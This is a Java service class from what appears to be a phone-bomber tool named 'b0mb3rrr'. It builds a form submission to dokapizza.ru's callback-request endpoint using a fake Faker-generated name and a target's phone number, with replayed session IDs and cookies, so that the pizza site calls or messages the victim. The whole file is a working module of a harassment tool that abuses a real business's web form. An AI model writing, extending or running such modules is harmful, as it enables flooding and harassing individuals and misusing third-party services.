package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.MultipartBody;

public class DokapizzaPhone extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("bxajaxid", "a375e6fe34e12574d6432ee399b0ee25")
                .addFormDataPart("AJAX_CALL", "Y")
                .addFormDataPart("sessid", "d4dca2772bf84e5e5a455d9863f9631e")
                .addFormDataPart("WEB_FORM_ID", "1")
                .addFormDataPart("form_text_1", this.getFaker().name().firstName())
                .addFormDataPart("form_text_2", phone.phone())
                .addFormDataPart("licenses_popup", "Y")
                .addFormDataPart("web_form_sent", "Y")
                .addFormDataPart("web_form_submit", "Y")
                .build();

        return new Request.Builder()
                .url("https://dokapizza.ru/bitrix/templates/food_s1/request.php?id=1&template=.default&parameters%5BAJAX_OPTION_ADDITIONAL%5D=i-4-intec-universe-main-header-template-1-dZcvT5yLZEp0_FORM_CALL&parameters%5BCONSENT_URL%5D=%2Fcompany%2Fconsent%2F&page=forms.get&siteId=s1&templateId=food_s1")
                .post(requestBody)
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .header("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Content-Type", "multipart/form-data; boundary=---------------------------20150118502922408211575410669")
                .header("Origin", "https://dokapizza.ru")
                .header("Connection", "keep-alive")
                .header("Referer", "https://dokapizza.ru/")
                .header("Cookie", "PHPSESSID=51SjmiTyPIpz07bHHN3HY4gNmiKi371A; BITRIX_SM_GUEST_ID=162094; BITRIX_SM_LAST_VISIT=11.04.2024%2022%3A26%3A34; BITRIX_SM_LAST_ADV=5_Y; BITRIX_SM_SALE_UID=c1b678a517ca9f145f5f682b15243db8; _ym_uid=1712863581821238632; _ym_d=1712863581; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A28%2C%22EXPIRE%22%3A1712869140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; _ym_visorc=w; REGIONALITY_REGION_ID=1; REGIONALITY_REGION_CURRENT=Y")
                .header("Upgrade-Insecure-Requests", "1")
                .header("Sec-Fetch-Dest", "iframe")
                .header("Sec-Fetch-Mode", "navigate")
                .header("Sec-Fetch-Site", "same-origin")
                .header("Sec-Fetch-User", "?1")
                .header("TE", "trailers");
    }

    @Override
    public String getServiceName() {
        return "DokapizzaPhone";
    }
}
